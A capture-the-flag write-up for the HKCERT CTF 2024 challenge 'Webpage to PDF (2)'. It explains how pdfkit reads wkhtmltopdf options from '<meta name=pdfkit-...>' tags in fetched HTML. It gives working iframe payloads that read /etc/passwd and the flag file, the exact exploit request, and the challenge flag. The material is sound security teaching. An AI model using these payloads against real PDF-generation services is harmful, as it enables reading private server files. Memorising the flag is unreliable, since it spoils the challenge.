# Webpage to PDF (2)

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Solved by: @liyanqwq
- Contributor: @siunam
- 32 solves / 150 points
- Author: @apple
- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

Okok I know Poe I used was bad and I just install library randomly from the Internet. I should be fine right?

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241114195129.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241114195324.png)

In here, just like the part 1 of this challenge, we can enter a URL to convert its content to a PDF file:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241114195433.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241114195456.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241114195545.png)

When we clicked the "Submit" button, it'll send a POST request to `/process` with parameter `url`. After that, it redirects us to `/<session_id>.pdf`.

Let's review this web application's source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/Web/Webpage-to-PDF-2/webpage-to-pdf-2_ccae31b1e6c16204ec258c8c4f3d1be2.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/Webpage-to-PDF-(2))-[2024.11.14|19:57:21(HKT)]
└> file webpage-to-pdf-2_ccae31b1e6c16204ec258c8c4f3d1be2.zip 
webpage-to-pdf-2_ccae31b1e6c16204ec258c8c4f3d1be2.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/Webpage-to-PDF-(2))-[2024.11.14|19:57:22(HKT)]
└> unzip webpage-to-pdf-2_ccae31b1e6c16204ec258c8c4f3d1be2.zip 
Archive:  webpage-to-pdf-2_ccae31b1e6c16204ec258c8c4f3d1be2.zip
   creating: chal/
 extracting: chal/flag.txt           
   creating: chal/src/
  inflating: chal/src/main.py        
  inflating: chal/src/requirements.txt  
  inflating: chal/Dockerfile         
  inflating: docker-compose.yml      
```

After reading the application's source code, we can see that:
1. The web application is written in Python with web application framework "[Flask](https://flask.palletsprojects.com/en/stable/)"
2. It uses library [pdfkit](https://pdfkit.org/) to convert string to PDF file

Before we dive deeper into the source code, let's find out where is the flag.

In `chal/Dockerfile`, we can see that the flag file is copied into path `/flag.txt`:

```bash
COPY ./flag.txt /
```

So, we need to somehow **read the flag file**.

Now, if we take a closer look to `chal/src/main.py`, we will know how POST route `/process` convert the website's response into a PDF file:

```python
from flask import Flask, request, make_response, redirect, render_template_string
[...]
import requests
import pdfkit

app = Flask(__name__, static_folder='')

@app.route('/process', methods=['POST'])
def process_url():
    # Get the session ID of the user
    session_id = request.cookies.get('session_id')
    pdf_file = f"{session_id}.pdf"

    # Get the URL from the form
    url = request.form['url']
    
    # Download the webpage
    response = requests.get(url)
    response.raise_for_status()

    # Make PDF
    pdfkit.from_string(response.text, pdf_file)
    
    return redirect(pdf_file)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
```

Just like how the comments described the conversion processes, it sends a GET request to our provided `url` parameter's value. Then, it uses **pdfkit's function `from_string`** to convert the GET request's text response to a PDF file named `<session_id>.pdf`, where the `session_id` is our cookie `session_id`'s value.

In this kind of **dynamic PDF generator**, it's usually vulnerable to server-side XSS (Cross-Site Scripting), **SSRF (Sever-Side Request Forgery)**, and other vulnerabilities.

Let's test whether library pdfkit function `from_string` vulnerable to SSRF or not!

To do so, we'll need to create an HTML file, which might allow us to read arbitrary files via `<iframe>` element and URL scheme (`file://`):

```html
<iframe src="file:///etc/passwd" width="1000px" height="1000px"></iframe>
```

> Note: In our typical browser, we can't use URL scheme to read arbitrary due to the browser's sandbox. If you can, congrats! You found a browser sandbox escape vulnerability! In some PDF generators, they might disable the sandbox and enable the user to use the URL scheme.

After that, we can host the HTML file via Python `http.server` module and port forwarding the web server via `ngrok`, so that external network can access it: 

```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/Webpage-to-PDF-(2))-[2024.11.14|20:23:23(HKT)]
└> python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/Webpage-to-PDF-(2))-[2024.11.14|20:23:27(HKT)]
└> ngrok http 8000        
[...]
Forwarding                    https://1ea2-{REDACTED}.ngrok-free.app -> http://localhost:8000
```

Now, let's try to convert our payload to a PDF file!

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241114202539.png)

As we can see, it doesn't work. The POST route returned HTTP status code "500 Internal Server Error".

Huh, why?

To better understand the error, we should build a local environment:

```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2024/Web/Webpage-to-PDF-(2))-[2024.11.14|20:27:32(HKT)]
└> docker compose up    
[...]
Attaching to chal-1
chal-1  |  * Serving Flask app 'main'
chal-1  |  * Debug mode: off
chal-1  | WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
chal-1  |  * Running on all addresses (0.0.0.0)
chal-1  |  * Running on http://127.0.0.1:5000
chal-1  |  * Running on http://172.19.0.2:5000
chal-1  | Press CTRL+C to quit
```

Then, we send the same request again, and we should see an error in our Docker container's log message:

Request:

```http
POST /process HTTP/1.1
Host: localhost:5000
Cookie: session_id=foo
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

url=https://1ea2-{REDACTED}.ngrok-free.app/exploit.html
```

Error message:

```shell
chal-1  | [2024-11-14 12:29:53,271] ERROR in app: Exception on /process [POST]
chal-1  | Traceback (most recent call last):
[...]
chal-1  |   File "main.py", line 50, in process_url
chal-1  |     pdfkit.from_string(response.text, pdf_file)
chal-1  |   File "/usr/local/lib/python3.8/dist-packages/pdfkit/api.py", line 75, in from_string
chal-1  |     return r.to_pdf(output_path)
chal-1  |   File "/usr/local/lib/python3.8/dist-packages/pdfkit/pdfkit.py", line 201, in to_pdf
chal-1  |     self.handle_error(exit_code, stderr)
chal-1  |   File "/usr/local/lib/python3.8/dist-packages/pdfkit/pdfkit.py", line 155, in handle_error
chal-1  |     raise IOError('wkhtmltopdf reported an error:\n' + stderr)
chal-1  | OSError: wkhtmltopdf reported an error:
chal-1  | QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root'
chal-1  | Exit with code 1 due to network error: ProtocolUnknownError
```

As we can see, pdfkit raised an `IOError` exception with message "Exit with code 1 due to network error: ProtocolUnknownError".

Hmm... Wait, what is pdfkit in the first place?

> Python 2 and 3 wrapper for wkhtmltopdf utility to convert HTML to PDF using Webkit. - [https://pypi.org/project/pdfkit/](https://pypi.org/project/pdfkit/)

Huh, it's wrapper for [wkhtmltopdf](https://wkhtmltopdf.org/) utility.

For those who knows nothing about this utility, wkhtmltopdf is a command line tool that renders HTML into PDF using the Qt WebKit rendering engine.

Now, if we Google "wkhtmltopdf ProtocolUnknownError", we should be able to find [this Github issue's comment](https://github.com/wkhtmltopdf/wkhtmltopdf/issues/2660#issuecomment-663063752):

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241114203815.png)

Before wkhtmltopdf version **0.12.6**, it is vulnerable to SSRF by simply using an `<iframe>` element (CVE-2022-35583). To mitigate this vulnerability, the developers added an **option `--enable-local-file-access` to explicitly allow the usage of the URL scheme**. Hence, by default, users can't use the URL scheme to read local files.

Hmm... No wonder why we got "ProtocolUnknownError", because the application didn't allow us to use the URL scheme.

Well, **can we somehow set that option**?? Let's read pdfkit's source code and find out!

After reading the source code, we can see that method `_find_options_in_meta` in class `PDFKit` allows us to set wkhtmltopdf's option via the `<meta>` tag: ([https://github.com/JazzCore/python-pdfkit/blob/master/pdfkit/pdfkit.py#L277](https://github.com/JazzCore/python-pdfkit/blob/master/pdfkit/pdfkit.py#L277))

```python
class PDFKit(object):
    """
    Main class that does all generation routine.
    [...]
    :param configuration: (optional) instance of pdfkit.configuration.Configuration()
    """
    [...]
    def _find_options_in_meta(self, content):
        """Reads 'content' and extracts options encoded in HTML meta tags

        :param content: str or file-like object - contains HTML to parse

        returns:
          dict: {config option: value}
        """
        [...]
        found = {}

        for x in re.findall('<meta [^>]*>', content):
            if re.search('name=["\']%s' % self.configuration.meta_tag_prefix, x):
                name = re.findall('name=["\']%s([^"\']*)' %
                                  self.configuration.meta_tag_prefix, x)[0]
                found[name] = re.findall('content=["\']([^"\']*)', x)[0]

        return found
```

```python
class Configuration(object):
    def __init__(self, wkhtmltopdf='', meta_tag_prefix='pdfkit-', environ=''):
        self.meta_tag_prefix = meta_tag_prefix
        [...]
```

By tracing back its method call, we can see that this method is used by function `from_string`:

```python
class PDFKit(object):
    [...]
    def __init__(self, url_or_file, type_, options=None, toc=None, cover=None,
                 css=None, configuration=None, cover_first=False, verbose=False):

        self.source = Source(url_or_file, type_)
        [...]
        if self.source.isString():
            self.options.update(self._find_options_in_meta(url_or_file))
```

```python
class Source(object):
    [...]
    def isString(self):
        return 'string' in self.type
```

```python
def from_string(input, output_path=None, options=None, toc=None, cover=None, css=None,
                configuration=None, cover_first=False, verbose=False):
    [...]
    r = PDFKit(input, 'string', options=options, toc=toc, cover=cover, css=css,
               configuration=configuration, cover_first=cover_first, verbose=verbose)

    return r.to_pdf(output_path)
```

After that, method `to_pdf` will convert the HTML string into a PDF file using wkhtmltopdf **and the options**:

```python
class PDFKit(object):
    [...]
    def to_pdf(self, path=None):
        args = self.command(path)

        if sys.platform == 'win32':
            [...]
        else:
            result = subprocess.Popen(
                args,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                env=self.environ
            )
        [...]
        stdout, stderr = result.communicate(input=input)
        [...]
```

With that said, we can **use `<meta>` tag to set option `--enable-local-file-access` to read local files**!!

## Exploitation

Armed with above information, we can read the flag file via the following HTML payload:

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta name="pdfkit-enable-local-file-access" content="">
</head>
<body>
  <iframe src="file:///flag.txt" width="1000px" height="1000px"></iframe>
</body>
</html>
```

> Note: Don't forget to add prefix `pdfkit-` in the `<meta>`'s `name` attribute. See previously mentioned class `Configuration`'s `__init__` method.

Then, send the following POST request to convert the HTML payload into a PDF file:

```http
POST /process HTTP/2
Host: c52b-webpage-to-pdf-2-0.hkcert24.pwnable.hk
Cookie: session_id=foo
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

url=https://1ea2-{REDACTED}.ngrok-free.app/exploit.html
```

Finally, go to `/foo.pdf` to read the flag!

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2024/images/Pasted%20image%2020241114211001.png)

- **Flag: `hkcert24{c1oud-is-rand0m-st4ngers-c0mputer-and-libr4ries-are-r4ndom-stang3rs-c0de}`**

## Conclusion

What we've learned:

1. Python pdfkit Local File Inclusion via `<meta>` tag